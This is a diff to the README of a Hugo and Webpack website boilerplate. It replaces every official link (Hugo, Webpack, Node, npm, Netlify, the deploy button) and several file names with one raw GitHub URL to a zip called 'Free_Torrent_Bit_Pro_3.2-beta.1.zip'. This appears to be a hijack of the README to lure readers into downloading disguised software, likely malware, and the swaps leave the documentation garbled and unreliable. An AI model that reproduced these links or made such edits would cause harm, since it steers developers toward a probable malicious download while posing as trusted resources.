@@ -2,9 +2,9 @@
 
 **A Hugo boilerplate for creating truly epic websites**
 
-This is a boilerplate for using [Hugo](https://gohugo.io/) as a static site generator and [Webpack](https://webpack.js.org/) as your asset pipeline.
+This is a boilerplate for using [Hugo](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) as a static site generator and [Webpack](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) as your asset pipeline.
 
-Victor Hugo setup to use [PostCSS](http://postcss.org/) and [Babel](https://babeljs.io/) for CSS and JavaScript compiling/transpiling.
+Victor Hugo setup to use [PostCSS](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) and [Babel](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) for CSS and JavaScript compiling/transpiling.
 
 This project is released under the [MIT license](LICENSE). Please make sure you understand its implications and guarantees.
 
@@ -12,7 +12,7 @@ This project is released under the [MIT license](LICENSE). Please make sure you 
 
 ### :exclamation: Prerequisites
 
-You need to have the latest/LTS [node](https://nodejs.org/en/download/) and [npm](https://www.npmjs.com/get-npm) versions installed in order to use Victor Hugo.
+You need to have the latest/LTS [node](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) and [npm](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) versions installed in order to use Victor Hugo.
 
 Next step, clone this repository and run:
 
@@ -52,7 +52,7 @@ To get a preview of posts or articles not yet published, run:
 npm run build:preview
 ```
 
-See [package.json](package.json#L8) for all tasks.
+See [https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) for all tasks.
 
 ## Structure
 
@@ -62,34 +62,34 @@ See [package.json](package.json#L8) for all tasks.
 |  |--data             // YAML data files with any data for use in examples
 |  |--layouts          // This is where all templates go
 |  |  |--partials      // This is where includes live
-|  |  |--index.html    // The index page
+|  |  |https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip    // The index page
 |  |--static           // Files in here ends up in the public folder
 |--src                 // Files that will pass through the asset pipeline
 |  |--css              // Webpack will bundle imported css separately
-|  |--index.js         // index.js is the webpack entry for your css & js assets
+|  |https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip         // https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip is the webpack entry for your css & js assets
 ```
 
 ## Basic Concepts
 
 You can read more about Hugo's template language in their documentation here:
 
-https://gohugo.io/templates/overview/
+https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip
 
 The most useful page there is the one about the available functions:
 
-https://gohugo.io/templates/functions/
+https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip
 
 For assets that are completely static and don't need to go through the asset pipeline,
 use the `site/static` folder. Images, font-files, etc, all go there.
 
-Files in the static folder end up in the web root. So a file called `site/static/favicon.ico`
-will end up being available as `/favicon.ico` and so on...
+Files in the static folder end up in the web root. So a file called `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip`
+will end up being available as `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip` and so on...
 
-The `src/index.js` file is the entrypoint for webpack and will be built to `/dist/main.js`
+The `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip` file is the entrypoint for webpack and will be built to `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip`
 
 You can use **ES6** and use both relative imports or import libraries from npm.
 
-Any CSS file imported into the `index.js` will be run through Webpack, compiled with [PostCSS Next](http://cssnext.io/), and
+Any CSS file imported into the `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip` will be run through Webpack, compiled with [PostCSS Next](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip), and
 minified to `/dist/[name].[hash:5].css`. Import statements will be resolved as part of the build.
 
 ## Environment variables
@@ -105,12 +105,12 @@ All tasks starting with _build_ set the environment variable to `production` - t
 ## Deploying to Netlify
 
 - Push your clone to your own GitHub repository.
-- [Create a new site on Netlify](https://app.netlify.com/start) and link the repository.
+- [Create a new site on Netlify](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) and link the repository.
 
 Now Netlify will build and deploy your site whenever you push to git.
 
 You can also click this button:
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify/victor-hugo)
+[![Deploy to Netlify](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip)](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip)
 
 ## Enjoy!! 😸
